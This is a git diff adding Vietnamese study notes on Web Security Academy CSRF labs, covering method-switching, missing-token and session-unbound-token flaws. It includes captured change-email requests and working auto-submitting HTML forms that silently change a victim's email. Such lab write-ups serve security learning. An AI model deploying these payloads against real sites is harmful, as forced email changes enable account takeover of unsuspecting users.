@@ -65,7 +65,77 @@ email=c%40gmail.com
 - Dán mã khai thác vào body 
 - Deliver to victim
 
-### 
+### Lab: CSRF where token validation depends on request method
+#### Analyis
+- Đăng nhập với tài khoản được cấp
+- Update email, gửi request update email tới **repeater**
+```http
+POST /my-account/change-email HTTP/2
+Host: 0a9400fc04dbc0a680c603b800f100c8.web-security-academy.net
+...
+email=c%40gmail.com&csrf=abcd
+```
+- Thử gửi không kèm **csrf** nhận được thông báo `"Missing parameter 'csrf'"`
+- Ý tưởng: Thay đổi **POST** sang **GET**, gửi không đính kèm **csrf**
+
+#### Exploit
+- Chuột phải > Change request method 
+- Gửi lại request không **kèm csrf** -> thành công
+- Tạo mã khai thác CSRF, và thay đổi email 
+```html
+    <form action="https://0ace008a036892158105c2af00eb0072.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="abc@gmail.com">
+    </form>
+    <script>
+            document.forms[0].submit();
+    </script>
+```
+- Đến **exploit server**
+- Dán mã khai thác vào body 
+- Deliver to victim
+
+> Lỗi do cấu hình xử lý method
+
+### Validation of CSRF token depends on token being present
+- Đăng nhập với tài khoản được cấp
+- Update email, gửi request update email tới **repeater**
+```http
+POST /my-account/change-email HTTP/2
+Host: 0a9400fc04dbc0a680c603b800f100c8.web-security-academy.net
+...
+email=c%40gmail.com&csrf=abcd
+```
+- Thử gửi không kèm **csrf** -> Thành công 
+- Một số ứng dụng chỉ kiểm tra tính hợp lệ của `CSRF token` nếu tham số `csrf` tồn tại trong request.
+- Tạo mã khai thác CSRF, thay đổi email, bỏ `csrf token` khỏi request
+```html
+    <form action="https://0a4e006304446a75803a172d00ae00f9.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="evil@gmail.com" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+```
+
+- Đến **exploit server**
+- Dán mã khai thác vào body 
+- Deliver to victim
+
+### Lab: CSRF where token is not tied to user session
+- Đăng nhập với tài khoản được cấp
+- Đến tab **Proxy**, bật **Intercept**
+- Update email
+- **Proxy** > **Intercept**, tìm đến tab chứa request **update email**
+- Tạo mã khai thác CSRF, thay đổi email, copy mã
+- Drop request, tắt **Intercept**
+- Đến **exploit server**
+- Dán mã khai thác vào body 
+- Deliver to victim
+
+Nyên lý hoạt động:
+- Một số ứng dụng tạo và xác thực `CSRF token` mà không ràng buộc token đó với phiên đăng nhập (**session**) cụ thể của người dùng. Thay vào đó, hệ thống chỉ kiểm tra xem token đó có nằm trong danh sách token đã phát hành hay không.
+- Do đó có thể sử dụng `CSRF token` để khai thác
 
 ## Prevent
 ---
